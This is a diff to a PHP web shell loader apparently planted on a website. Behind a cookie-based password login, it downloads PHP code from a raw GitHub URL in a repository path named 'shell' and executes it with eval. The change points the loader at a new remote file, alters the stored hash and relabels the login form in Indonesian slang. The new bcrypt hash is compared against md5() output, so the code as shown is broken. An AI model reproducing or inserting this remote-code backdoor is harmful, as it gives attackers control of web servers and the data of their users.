@@ -33,13 +33,13 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/dhee289/shell/shell/asu.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/dhee289/shell/shell/let.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
     if (isset($_POST['password'])) {
         $entered_password = $_POST['password'];
-        $hashed_password = '9c5b3082eae2c54711bb99f361f58073'; // Replace this with your MD5 hashed password
+        $hashed_password = '$2y$10$e4iHVsmwucrxJaaIklKsM.F05zSNmt5s0DROMXmuR6Ra2cvtTONqq'; // Replace this with your MD5 hashed password
         if (md5($entered_password) === $hashed_password) {
             // Password is correct, set a cookie to indicate login
             setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
@@ -52,13 +52,13 @@ if (is_logged_in()) {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Admin Login</title>
+        <title>Login Plerr</title>
     </head>
     <body>
         <form method="POST" action="">
-            <label for="password">Admin:</label>
+            <label for="password">Masukin</label>
             <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
+            <input type="submit" value="Croot">
         </form>
     </body>
     </html>
